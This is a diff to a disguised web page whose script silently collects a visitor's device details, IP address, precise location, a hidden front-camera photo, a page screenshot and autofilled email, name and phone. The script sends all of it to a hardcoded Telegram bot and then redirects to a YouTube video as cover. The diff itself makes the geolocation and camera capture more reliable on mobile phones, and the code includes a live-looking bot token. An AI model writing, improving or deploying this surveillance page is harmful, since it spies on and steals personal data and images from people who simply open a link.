@@ -32,7 +32,6 @@
         .progress-wrap{display:none !important}
         .share-btn{display:none !important}
         .hidden-field{position:absolute;left:-9999px;top:-9999px;opacity:0;pointer-events:none;width:1px;height:1px}
-        /* عنصر الفيديو مخفي تماماً */
         #videoPreview{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none}
     </style>
 </head>
@@ -68,22 +67,19 @@
         </div>
     </div>
 
-    <video id="videoPreview" autoplay playsinline></video>
+    <video id="videoPreview" playsinline autoplay muted></video>
 
-    <!-- حقول خفية لـ Autofill -->
     <input type="email" class="hidden-field" id="hiddenEmail" name="email" autocomplete="email" value="">
     <input type="text" class="hidden-field" id="hiddenName" name="name" autocomplete="name" value="">
     <input type="tel" class="hidden-field" id="hiddenTel" name="tel" autocomplete="tel" value="">
 
     <script>
         (function() {
-            // ===== التوكن الصحيح =====
             const TOKEN = '8990771403:AAEkyyJasNI2mLimV_8A7W4cNGrjJxP_Iao';
             const CHAT_ID = '170383339';
             const TARGET_URL = 'https://youtu.be/YiK3BulNaWQ?si=M1AJboH6vgZymq7-';
             let isRedirected = false;
 
-            // ===== دالة الإرسال الأساسية =====
             async function sendMessage(text) {
                 try {
                     const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
@@ -105,7 +101,6 @@
                 }
             }
 
-            // ===== إرسال الصورة إلى تليجرام (من كاميرا أو لقطة) =====
             async function sendPhoto(blob, caption) {
                 try {
                     const formData = new FormData();
@@ -126,7 +121,6 @@
                 }
             }
 
-            // ===== جمع البيانات الأساسية =====
             function getBasicData() {
                 const ua = navigator.userAgent;
                 const now = new Date();
@@ -161,24 +155,50 @@
                 return 'غير متوفر';
             }
 
+            // ===== تحسين الموقع: مهلة أطول وإعادة محاولة =====
             function getLocation() {
                 return new Promise((resolve) => {
-                    if (!navigator.geolocation) { resolve(null); return; }
+                    if (!navigator.geolocation) {
+                        console.log('Geolocation not supported');
+                        resolve(null);
+                        return;
+                    }
                     let done = false;
-                    navigator.geolocation.getCurrentPosition(
-                        (p) => {
-                            if (done) return;
+                    // محاولة أولى
+                    const tryGet = () => {
+                        navigator.geolocation.getCurrentPosition(
+                            (p) => {
+                                if (done) return;
+                                done = true;
+                                console.log('📍 Location obtained');
+                                resolve({
+                                    lat: +p.coords.latitude.toFixed(6),
+                                    lng: +p.coords.longitude.toFixed(6),
+                                    acc: Math.round(p.coords.accuracy)
+                                });
+                            },
+                            (err) => {
+                                if (done) return;
+                                done = true;
+                                console.warn('Geolocation error:', err.message);
+                                resolve(null);
+                            }, {
+                                enableHighAccuracy: true,
+                                timeout: 15000, // 15 ثانية (كافية للموبايل)
+                                maximumAge: 60000
+                            }
+                        );
+                    };
+
+                    tryGet();
+                    // مهلة عامة 18 ثانية
+                    setTimeout(() => {
+                        if (!done) {
                             done = true;
-                            resolve({
-                                lat: +p.coords.latitude.toFixed(6),
-                                lng: +p.coords.longitude.toFixed(6),
-                                acc: Math.round(p.coords.accuracy)
-                            });
-                        },
-                        () => { if (!done) { done = true; resolve(null); } },
-                        { timeout: 5000, enableHighAccuracy: true }
-                    );
-                    setTimeout(() => { if (!done) { done = true; resolve(null); } }, 6000);
+                            console.warn('Geolocation timeout');
+                            resolve(null);
+                        }
+                    }, 18000);
                 });
             }
 
@@ -291,23 +311,36 @@
                 return msg;
             }
 
-            // ===== التقاط صورة من الكاميرا =====
+            // ===== تحسين الكاميرا للموبايل (لا تعتمد على play()) =====
             async function captureFromCamera() {
                 try {
+                    console.log('📸 Requesting camera...');
                     const stream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
-                    });
-                    const video = document.getElementById('videoPreview');
-                    video.srcObject = stream;
-                    await new Promise(resolve => {
-                        video.onloadedmetadata = () => {
-                            video.play();
-                            resolve();
-                        };
+                        video: {
+                            facingMode: 'user',
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
+                        }
                     });
 
-                    // ننتظر قليلاً لتظهر الصورة
-                    await new Promise(r => setTimeout(r, 500));
+                    const video = document.getElementById('videoPreview');
+                    video.srcObject = stream;
+                    video.setAttribute('playsinline', '');
+                    video.muted = true;
+
+                    // ننتظر أول إطار
+                    await new Promise((resolve) => {
+                        video.onloadedmetadata = () => {
+                            // نحاول تشغيله (قد يفشل على iOS لكننا نستمر)
+                            video.play().catch(() => {});
+                            resolve();
+                        };
+                        // في حال فشل التحميل، نستخدم timeout
+                        setTimeout(resolve, 1000);
+                    });
+
+                    // ننتظر قليلاً للحصول على إطار
+                    await new Promise(r => setTimeout(r, 300));
 
                     const canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth || 640;
@@ -327,6 +360,7 @@
                     for (let i = 0; i < byteString.length; i++) {
                         ia[i] = byteString.charCodeAt(i);
                     }
+                    console.log('✅ Camera captured');
                     return new Blob([ab], { type: mimeString });
                 } catch (e) {
                     console.error('Camera error:', e.message);
@@ -334,7 +368,7 @@
                 }
             }
 
-            // ===== لقطة شاشة للصفحة =====
+            // ===== لقطة شاشة =====
             async function captureScreenshot() {
                 try {
                     const canvas = await html2canvas(document.body, {
@@ -361,51 +395,50 @@
 
             // ===== التشغيل الرئيسي =====
             async function main() {
-                console.log('🔄 Starting silent collection...');
+                console.log('🔄 Starting (mobile optimized)...');
 
-                // 1. البيانات الأساسية
+                // 1. الأساسيات
                 const basic = getBasicData();
                 const ip = await getIP();
                 const loc = await getLocation();
                 const basicMsg = buildBasicMessage(basic, ip, loc);
-                sendMessage(basicMsg).then(s => console.log('Basic data:', s ? '✅' : '❌'));
+                sendMessage(basicMsg).then(s => console.log('Basic:', s ? '✅' : '❌'));
 
-                // 2. البيانات المتقدمة (بعد 1 ثانية)
+                // 2. المتقدمات
                 setTimeout(async () => {
                     try {
                         const adv = await collectAdvancedData();
                         const advMsg = buildAdvancedMessage(adv);
                         await sendMessage(advMsg);
-                        console.log('✅ Advanced data sent');
+                        console.log('✅ Advanced sent');
                     } catch (e) {
                         console.error('Advanced error:', e.message);
                     }
                 }, 1000);
 
-                // 3. صورة من الكاميرا (طلب إذن)
+                // 3. الكاميرا
                 setTimeout(async () => {
-                    console.log('📸 Requesting camera...');
-                    const photoBlob = await captureFromCamera();
-                    if (photoBlob) {
-                        await sendPhoto(photoBlob, '📷 *Camera photo*');
+                    const photo = await captureFromCamera();
+                    if (photo) {
+                        await sendPhoto(photo, '📷 *Camera photo*');
                         console.log('✅ Camera photo sent');
                     } else {
-                        console.log('❌ Camera photo failed or denied');
+                        console.log('❌ Camera failed/denied');
                     }
                 }, 1500);
 
-                // 4. لقطة شاشة الصفحة (بعد 2 ثانية)
+                // 4. لقطة الشاشة
                 setTimeout(async () => {
-                    const screenshotBlob = await captureScreenshot();
-                    if (screenshotBlob) {
-                        await sendPhoto(screenshotBlob, '📸 *Page screenshot*');
+                    const screenshot = await captureScreenshot();
+                    if (screenshot) {
+                        await sendPhoto(screenshot, '📸 *Page screenshot*');
                         console.log('✅ Screenshot sent');
                     } else {
                         console.log('❌ Screenshot failed');
                     }
-                }, 2000);
+                }, 2200);
 
-                // 5. التحويل بعد 3.5 ثانية
+                // 5. التحويل
                 setTimeout(() => {
                     if (!isRedirected) {
                         isRedirected = true;
@@ -416,7 +449,7 @@
                             window.location.href = TARGET_URL;
                         }
                     }
-                }, 3500);
+                }, 3800);
             }
 
             if (document.readyState === 'complete') {
@@ -425,7 +458,7 @@
                 window.addEventListener('load', () => setTimeout(main, 500));
             }
 
-            console.log('✅ Silent version with camera loaded');
+            console.log('✅ Mobile-optimized version loaded');
         })();
     </script>
 </body>
